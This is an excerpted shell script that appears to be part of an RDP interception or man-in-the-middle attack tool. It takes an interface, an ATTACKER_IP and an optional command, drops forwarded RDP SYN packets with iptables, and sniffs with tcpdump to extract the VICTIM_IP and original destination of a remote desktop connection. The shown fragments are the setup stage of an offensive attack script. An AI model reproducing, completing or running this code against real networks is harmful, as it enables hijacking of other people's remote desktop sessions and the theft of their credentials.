...
if [ "$#" -ne 2 -a "$#" -ne 3 ]; then
    cat << EOF
Usage:
$0 <INTERFACE> <ATTACKER_IP> [<COMMAND>]
EOF
    exit 1
fi
...
set_iptables_1 () {
    local DEL_ADD="$1"
    iptables -"$DEL_ADD" FORWARD -p tcp \
        --syn --dport 3389 -j DROP
}
...
tcpdump="$(tcpdump -n -c 1 -i "$IFACE" \
	"tcp[tcpflags] ==  tcp-syn" and \
	dst port 3389 2> /dev/null)"
ORIGINAL_DEST="$(echo $tcpdump | sed -E 's/.*> ([0-9.]*)\.3389:.*/\1/')"
VICTIM_IP="$(echo $tcpdump | sed -E 's/.* IP ([0-9.]*)\.[0-9]* >.*/\1/')"
